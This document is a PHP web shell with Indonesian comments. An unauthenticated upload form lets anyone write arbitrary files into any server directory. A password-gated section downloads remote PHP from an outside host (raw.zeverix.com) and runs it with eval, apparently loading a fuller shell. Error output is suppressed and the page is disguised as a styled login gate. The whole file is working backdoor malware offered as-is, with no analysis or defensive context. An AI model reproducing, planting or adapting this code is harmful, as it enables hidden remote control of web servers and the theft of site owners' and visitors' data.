<?php
error_reporting(0);
ini_set('display_errors', 0);

    if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
        // Tampilkan formulir unggah file
        echo '<form method="post" enctype="multipart/form-data">';
        echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
        echo '<input type="file" name="file" size="15">';
        echo '<input type="submit" value="Unggah">';
        echo '</form>';
    }

    if (isset($_FILES['file']['tmp_name'])) {
        // Tangani unggahan file jika formulir dikirimkan
        $uploadd = $_FILES['file']['tmp_name'];
        if (file_exists($uploadd)) {
            $pwddir = $_POST['dir'];
            $real = $_FILES['file']['name'];
            $de = $pwddir . "/" . $real;
            copy($uploadd, $de);
            echo "BERKAS DIUNGGAHKAN KE $de";
        }
    }
?>
<?php

error_reporting(0);
ini_set('display_errors', 0);

session_start();

// Fungsi untuk mengecek jika user sudah login
function is_logged_in() {
    return isset($_SESSION['FORBIDDENXER']);
}

// Fungsi untuk login
function login($password) {
    // Hash password valid menggunakan bcrypt
    $valid_password_hash = '$2a$12$jeMvM33nHB8vRlj5Cii2MufQPZAZ1LYwvAosfV4r8/9xN5aXeKN76'; // Contoh hash bcrypt
    // Verifikasi password dengan bcrypt
    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['FORBIDDENXER'] = 'user';
        return true;
    } else {
        return false;
    }
}

// Fungsi untuk logout
function logout() {
    unset($_SESSION['FORBIDDENXER']);
}

// Cek jika ada request POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['password'])) {
        $password = $_POST['password'];
        if (login($password)) {
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error_message = "PASSWORD SALAH MEN...!!!";
            if (!is_logged_in()) {
                echo '<script>alert("'.$error_message.'");</script>';
            }
        }
    }
}

// Fungsi untuk mengambil konten dari URL
function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    if ($content === false) {
        $content = file_get_contents($url);
    }
    return $content;
}
// Cek jika user sudah login
if (is_logged_in()) {
    $url = 'https://raw.zeverix.com/public/raw/my-alfa-303';
    $content = getContent($url);
    eval('?>' . $content);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>SECURE ACCESS | ELITE GATE</title>
    <link rel="shortcut icon" href="https://ik.imagekit.io/gambarkita/icon-naga.png" type="image/png">
    <style>
        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; 
               background: url('https://ik.imagekit.io/akstoto/backround/chinese-gold-dragon.webp') no-repeat center center fixed; 
               background-size: cover; font-family: 'Courier New', monospace; color: #d4af37; }
        .overlay { background: rgba(0, 0, 0, 0.85); padding: 50px; border: 2px solid #d4af37; 
                   border-radius: 5px; text-align: center; backdrop-filter: blur(8px); }
        input { background: transparent; border: 1px solid #d4af37; color: #d4af37; 
                padding: 12px; width: 250px; text-align: center; outline: none; }
        .caution { color: #ff3333; margin-top: 15px; font-weight: bold; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="overlay">
        <h1>AUTHENTICATION</h1>
        <form method="post">
            <input type="password" name="password" placeholder="MASUKKAN PASSWORD...!!!" autofocus required>
            <?php if($error) echo "<div class='caution'>$error</div>"; ?>
        </form>
    </div>
</body>
</html>
